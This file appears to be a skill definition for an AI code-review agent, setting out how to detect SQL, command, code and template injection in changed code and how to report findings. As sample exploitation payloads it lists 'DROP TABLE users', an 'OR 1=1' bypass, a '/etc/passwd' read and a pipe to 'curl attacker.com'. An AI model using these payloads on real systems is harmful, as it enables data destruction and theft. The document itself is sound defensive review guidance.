---
name: injection-vulnerabilities
description: "Detect SQL injection, command injection, code injection, and template injection in user-controlled input flows."
allowed-tools: Read Grep Glob WebFetch WebSearch
---

# Injection Vulnerabilities

This is a Superwarden child skill for parent **security** and task **injection-vulnerabilities**.

## Scope

Detect SQL injection (CWE-89), command injection (CWE-78), code injection (CWE-94), and template injection vulnerabilities in changed code where user-controlled inputs flow into SQL queries, shell commands, eval constructs, template engines, or dynamic code execution without proper sanitization or parameterization.

## Investigation Protocol

### Repository-Local Source Inspection (Required)

You **must** perform deep repo-local investigation before reporting findings:

- Use **Read**, **Grep**, and **Glob** to inspect changed files, trace data flows from untrusted input to execution sinks, examine existing patterns, and understand framework-specific defenses.
- Trace changed lines to identify where user-controlled input (CLI arguments, environment variables, HTTP request parameters, file contents, GitHub webhook payloads, LLM outputs, repository metadata) flows into:
  - SQL query construction (string concatenation, template literals, ORM raw query methods)
  - Shell command execution (`child_process.exec`, `spawn` with `shell: true`, command string construction)
  - Dynamic code evaluation (`eval()`, `new Function()`, `vm.runInContext()`, dynamic `import()` with user paths)
  - Template rendering (EJS `<%- %>`, Handlebars `{{{ }}}`, unsafe template compilation)
- Examine existing execution patterns:
  - `src/utils/exec.ts`: `execFileNonInteractive` (safe), `execNonInteractive` (shell injection risk), `execGitNonInteractive` (safe git wrapper)
  - `src/cli/git.ts`: All git commands use argument arrays (safe pattern)
  - `src/sdk/runtimes/claude.ts`: Mutating tools blocked via `disallowedTools`
  - `evals/fixtures/sql-injection/api.ts`: Example vulnerable pattern (string interpolation into SQL)
- Search for dependency manifest files to infer database libraries (check for absence of Prisma, Sequelize, Knex, TypeORM, Drizzle, Mongoose)
- Identify whether changed code introduces new injection sinks or alters data flow into existing sinks

### External Prior Art and Current Documentation (When Framework/Runtime Behavior Affects Findings)

Use **WebSearch** or **WebFetch** for current public documentation when framework, runtime, or vulnerability behavior affects exploitability:

- OWASP injection prevention guidance (SQL Injection Prevention Cheat Sheet, Injection Prevention Cheat Sheet)
- CWE definitions (CWE-89 SQL Injection, CWE-78 OS Command Injection, CWE-94 Code Injection, CWE-1336 Template Injection)
- Node.js child_process security (CVE-2024-27980, CVE-2024-36138, spawn vs exec, shell option risks)
- Database library parameterization patterns (prepared statements, query builders, ORM protections)
- Template engine escaping (Handlebars `{{ }}` vs `{{{ }}}`, EJS `<%= %>` vs `<%- %>`, Pug automatic escaping)
- Dynamic code evaluation risks (eval, Function constructor, vm module sandbox limitations)

**Strict Prohibition**: Do **not** send repository code, secrets, private file paths, or proprietary details to web tools. Use only public framework, package, API, vulnerability class, and ecosystem convention names.

## Finding Requirements

Report findings **only** when you have:

1. **Changed-Line Anchoring**: The specific changed line numbers where user input flows into an unsafe sink without sanitization or parameterization.

2. **Concrete Data-Flow Trace**: A complete trace from the untrusted input source to the vulnerable sink:
   - **SQL injection**: HTTP request parameter → string concatenation → `db.query(sql)`
   - **Command injection**: CLI argument → template literal → `exec(command)`
   - **Code injection**: File content → eval → arbitrary code execution
   - **Template injection**: User input → unescaped template variable → XSS or RCE

3. **Repository Source Evidence**: Reference to existing patterns showing how the changed code deviates from or bypasses safe patterns. For example:
   - Uses string interpolation instead of parameterized queries
   - Uses `exec` with shell instead of `execFileNonInteractive` with argument arrays
   - Uses `eval` instead of JSON.parse for data parsing
   - Uses unescaped template syntax instead of auto-escaped syntax

4. **Public Documentation Reference** (when behavior affects the attack):
   - OWASP SQL Injection Prevention Cheat Sheet for parameterized query patterns
   - CWE-89, CWE-78, CWE-94, CWE-1336 definitions for vulnerability classification
   - Node.js child_process security guidance for command injection vectors
   - Template engine documentation for escaping behavior

5. **Exploitability Prerequisites**: Document conditions required for exploitation:
   - Attacker control over the input source
   - Absence of input validation (allowlist, type checking, sanitization)
   - Unsafe API usage (string concatenation in SQL, shell execution, eval, unescaped template variables)
   - Missing framework protections (ORM parameterization, template auto-escaping)

6. **Concrete Exploitation Example**: A realistic attack payload:
   - **SQL injection**: `'; DROP TABLE users; --` or `' OR '1'='1` for authentication bypass
   - **Command injection**: `; cat /etc/passwd` or `| curl attacker.com` for arbitrary command execution
   - **Code injection**: JavaScript payload exfiltrating data or executing commands
   - **Template injection**: SSTI payload for server-side code execution or XSS payload for client-side execution

7. **Severity and Confidence Calibration**:
   - **High severity**: Direct data exfiltration, arbitrary code/command execution, or authentication bypass without privilege boundaries
   - **Medium severity**: Injection requiring specific privileges, limited impact, or significant exploitation barriers
   - **Low severity**: Theoretical injection with low likelihood of exploitation
   - **High confidence**: Complete data-flow trace with concrete exploitation example
   - **Medium confidence**: Data-flow trace with plausible exploitation but missing some context
   - **Low confidence**: Partial data-flow or requires assumptions about missing context

8. **Realistic Impact**: The actual security consequence:
   - Data exfiltration (SQL injection reading sensitive tables)
   - Authentication bypass (SQL injection tautology conditions)
   - Data manipulation or deletion (SQL injection UPDATE/DELETE)
   - Arbitrary command execution (command injection via shell)
   - Remote code execution (code injection via eval or template injection)
   - Cross-site scripting (template injection without escaping)

9. **Concrete Remediation Pattern**: Smallest safe fix with code-level specificity:
   - **SQL injection**: Use parameterized queries or ORM query builders instead of string concatenation
   - **Command injection**: Use `execFileNonInteractive` with argument arrays instead of shell execution; validate input against allowlists
   - **Code injection**: Use JSON.parse() instead of eval; avoid Function constructor; validate dynamic import paths
   - **Template injection**: Use auto-escaped template syntax; enable template engine security options; validate and sanitize user input

### When Evidence Is Insufficient

If repository context is insufficient to determine injection risk (e.g., input trustworthiness unknown, data flow boundaries unclear, framework defenses uncertain), **state the missing context** explicitly and describe what evidence would be required to confirm or rule out the vulnerability.

**Do not report speculative findings.** Return an **empty findings array** when evidence is incomplete.

## Attack Surface Review

Inspect changed lines and their data-flow paths to identify:

### 1. SQL Injection

Trace changed code that constructs SQL queries from user input.

- Identify string concatenation, template literals, or format strings building SQL queries from untrusted input
- Check if parameterized queries, prepared statements, or ORM query builders are used
- Examine whether input validation (type checking, allowlists, escaping) prevents injection
- Search for database query execution patterns in code using `.query()`, `.execute()`, `.raw()`

**Repository Context**: `evals/fixtures/sql-injection/api.ts` demonstrates vulnerable pattern (lines 29-40): string interpolation `name = '${params.name}'` allows SQL injection via `'; DROP TABLE users; --`. No database ORM dependencies detected in `package.json` (Prisma, Sequelize, Knex, TypeORM, Drizzle, Mongoose absent), suggesting manual query construction risk if database code exists.

**Public Reference**: [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html), [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html), [Node.js SQL Injection Prevention](https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/), [Parameterized Queries in Node.js](https://medium.com/@ajay.monga73/parameterized-queries-javascript-guide-how-to-prevent-sql-injection-with-parameterized-queries-18c5cbbfffe2)

### 2. Command Injection via Shell Execution

Trace changed code that invokes shell commands with user input.

- Identify `child_process.exec`, `child_process.spawn` with `shell: true`, or shell command string construction from untrusted input
- Check if shell metacharacters (`;`, `|`, `&`, `$`, `` ` ``, `(`, `)`, `<`, `>`) can be injected
- Examine whether `execFileNonInteractive` or `spawn` without shell is used for safer execution
- Search for argument arrays instead of string concatenation, `--` separator for flag injection prevention

**Repository Context**: `src/utils/exec.ts` provides `execNonInteractive(command)` which uses `spawnSync(command, { shell: true })` (line 68) and is **vulnerable to command injection** if `command` contains untrusted input. `execFileNonInteractive(file, args)` uses `spawnSync(file, args)` without shell (line 105) and is **safe** when `file` and `args` are controlled. All git commands in `src/cli/git.ts` use `execGitNonInteractive` with argument arrays (safe pattern).

**Public Reference**: [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html), [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html), [Node.js Command Injection Prevention](https://www.nodejs-security.com/blog/secure-javascript-coding-practices-against-command-injection-vulnerabilities)

### 3. Code Injection via Dynamic Evaluation

Trace changed code that uses `eval()`, `new Function()`, `vm.runInContext()`, `vm.runInNewContext()`, or dynamic `import()` with user input.

- Identify untrusted input passed to code evaluation APIs without sanitization
- Check if code evaluation is necessary or can be replaced with safer alternatives (JSON.parse, object property access, switch statements)
- Examine whether code evaluation is sandboxed (separate process, restricted permissions)
- Search for eval usage, Function constructor, vm module usage, and dynamic import with user-controlled paths

**Repository Context**: Grep search for eval, Function constructor, and vm module found no application code usage. Dynamic imports exist only in test code and skills loader for circular dependency resolution (`await import('./remote.js')`). No code injection attack surface identified in current codebase.

**Public Reference**: [CWE-94: Code Injection](https://cwe.mitre.org/data/definitions/94.html), [eval Security Risks](https://www.nodejs-security.com/learn/nodejs-runtime-security/prevent-dynamic-eval), [vm Module Limitations](https://snyk.io/blog/security-concerns-javascript-sandbox-node-js-vm-module/)

### 4. Template Injection

Trace changed code that renders templates with user input.

- Identify unescaped template variables (EJS `<%- %>`, Handlebars `{{{ }}}`) receiving untrusted input
- Check if auto-escaped syntax (EJS `<%= %>`, Handlebars `{{ }}`, Pug `#{}`) is used
- Examine whether template engine security options are enabled (automatic escaping, strict mode)
- Search for template rendering in `.render()`, `.compile()`, `dangerouslySetInnerHTML`, `innerHTML`

**Repository Context**: Grep search found `dangerouslySetInnerHTML` usage in React code (Ink UI rendering in `src/cli/output/`). No template engine dependencies detected in `package.json` (Handlebars, EJS, Pug, Mustache, Nunjucks absent). React's `dangerouslySetInnerHTML` usage should be examined for XSS risk when user input is rendered.

**Public Reference**: [OWASP SSTI Testing Guide](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection), [Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection), [Node.js Template Engines Security](https://www.veracode.com/blog/secure-development/nodejs-template-engines-why-default-encoders-are-not-enough), [JavaScript SSTI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md)

## Out of Scope

Do **not** cover the following concerns, as they are owned by sibling tasks:

- **Authentication and authorization bypass** (covered by access-control-vulnerabilities): Missing authentication checks, authorization flaws, privilege escalation. Only report injection when it enables authentication bypass (e.g., SQL injection `' OR '1'='1`).

- **Cryptographic implementation flaws** (covered by cryptographic-vulnerabilities): Weak algorithms, insecure random number generation, hardcoded keys. Only report injection when it relates to query/command construction, not crypto choices.

- **Dependency vulnerabilities** (covered by dependency-vulnerabilities): Vulnerable packages, outdated dependencies. Only report injection introduced by application code, not dependency CVEs.

- **Secrets and credentials exposure** (covered by secrets-exposure): Hardcoded credentials, API keys, tokens. Only report injection, not secret storage.

- **Resource exhaustion or denial-of-service** (covered by resource-handling-vulnerabilities): Unbounded loops, memory leaks, missing input size limits. Only report injection, not resource handling.

- **Style, formatting, or code quality** unrelated to injection risk.

## False Positive Controls

### Safe Patterns to Exclude

- Parameterized queries or ORM query builders (prepared statements, bound parameters)
- `execFileNonInteractive` or `spawn` without shell using controlled arguments
- Argument arrays with validation and `--` separator
- JSON.parse() for data parsing instead of eval
- Auto-escaped template syntax (Handlebars `{{ }}`, EJS `<%= %>`, Pug `#{}`)
- Input validation with strict allowlists (alphanumeric-only, type checking, regex)

### Context That Reduces Severity

- Injection only reachable by authenticated administrators
- Defense-in-depth controls (sandboxing, read-only database users, least privilege)
- Input validation with strict type enforcement limiting injection surface
- Framework protections (ORM escaping, template auto-escaping) correctly applied

## Output Requirements

For each finding, provide a Warden finding object matching the existing report schema:

- `line`: The specific changed line number where user input flows into the unsafe sink
- `message`: Clear description (e.g., "SQL injection via string interpolation of user-controlled 'name' parameter into query")
- `severity`: "high" | "medium" | "low" (calibrated per severity guidance)
- `confidence`: "high" | "medium" | "low" (calibrated per confidence guidance)
- `metadata`: Include data-flow trace, exploitation example, public reference, remediation pattern

**When evidence is insufficient**, state the missing context and return an **empty findings array**. Do not report speculative findings.

## Framework and Runtime Caveats

- **SQL injection**: Parameterization syntax varies by database library. PostgreSQL `$1`, MySQL `?`, some ORMs use named parameters. Verify library-specific patterns.
- **Command injection on Windows**: CVE-2024-27980 (batch file injection) affects Node.js `spawn` even without shell on Windows. Argument validation required for defense-in-depth.
- **vm module limitations**: Not a true sandbox. Code can modify prototypes, access parent context, escape via constructor chains.
- **Template engine context**: Different escaping for HTML context vs JavaScript context vs URL context. Auto-escaping may not cover all contexts.
- **ORM query builders**: `.raw()` or `.unsafe()` methods bypass parameterization. Inspect for string concatenation in raw query methods.
- **React dangerouslySetInnerHTML**: Client-side XSS risk, not server-side injection, but should be examined for user input rendering.

## Missing Context

The following context would improve finding precision but is not available during synthesis:

- **Technology stack**: Whether application uses database (SQL/NoSQL), which libraries (raw drivers vs ORMs), which template engines
- **Input trustworthiness model**: Which input sources are trusted vs untrusted (CLI args, env vars, file contents, HTTP requests, webhooks, LLM outputs)
- **Framework defenses**: Whether ORM parameterization, template auto-escaping, or input validation middleware is in use
- **Deployment environment**: Whether application runs with database access, shell execution permissions, network access
- **Privilege model**: Whether injection is reachable by unauthenticated users, authenticated users, or only administrators

When evaluating changed code, explicitly note when missing context prevents conclusive determination of injection risk. Do not invent facts or assume security properties without evidence.
